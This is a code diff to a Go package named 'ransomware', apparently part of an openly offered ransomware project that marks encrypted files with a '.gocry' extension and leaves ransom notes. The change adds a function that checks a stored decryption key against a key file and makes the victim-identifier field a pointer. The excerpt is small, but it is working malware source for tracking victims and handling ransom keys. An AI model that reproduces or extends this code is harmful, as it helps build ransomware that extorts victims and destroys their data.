@@ -1,6 +1,7 @@
 package ransomware
 
 import (
+	"bytes"
 	"errors"
 	"io/ioutil"
 	"log"
@@ -18,7 +19,7 @@ type Ransomware struct {
 	PublicKey string
 	RootDir   string
 	IP        string
-	Data      victim.VictimIndentifier
+	Data      *victim.VictimIndentifier
 }
 
 // CheckIfActiveRansom checks for any files with the .gocry extension such that then
@@ -100,6 +101,19 @@ func (rw *Ransomware) RemoveKeyFile() error {
 	}
 
 	return nil
+}
+
+func (rw *Ransomware) CheckIfValidKey() bool {
+	key, err := ioutil.ReadFile(rw.RootDir + "/key.txt")
+	if err != nil {
+		return false
+	}
+
+	if bytes.Equal(key, rw.Key) {
+		return true
+	}
+
+	return false
 }
 
 // RemoveRansomFile removes the generated ransom file which notifies user that the computer
